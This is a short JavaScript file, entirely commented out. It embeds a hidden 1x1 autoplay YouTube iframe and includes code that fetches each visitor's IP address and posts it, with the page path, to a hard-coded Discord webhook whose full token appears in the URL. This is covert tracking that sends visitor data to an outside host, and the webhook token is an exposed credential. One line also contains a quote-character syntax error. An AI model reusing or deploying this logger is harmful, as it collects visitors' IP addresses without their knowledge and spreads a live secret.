/*<iframe id=\"iframe\" width=\"1\" height=\"1\" src=\"https://www.youtube.com/embed/dQw4w9WgXcQ?controls=0\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>');*/

/*  
ajax = new XMLHttpRequest();
if(ajax!=null){
    ajax.open("GET","https://europe-west3-devrcc.cloudfunctions.net/whatismyip",true);
    ajax.onreadystatechange = function() {
        if(this.readyState == 4) {
            if(this.status == 200) {
                sendMessage(this.responseText);
            }
        }
    }
    ajax.send(null);
}

const iframe = document.getElementById("iframe");
alert(iframe.contentDocument.querySelector(“div.class”));


function sendMessage(message) {
  const request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/965619205942698004/_4Oa1M_C6gcmZfLsN9bAWck-BHS9B1aswrb8Au0mIWQdmE7KKj6Cc16qeToiz0SZ_UQT");

  request.setRequestHeader('Content-type', 'application/json');

  const params = {
    username: window.location.pathname,
    avatar_url: "",
    content: message
  }
  
  request.send(JSON.stringify(params));
}*/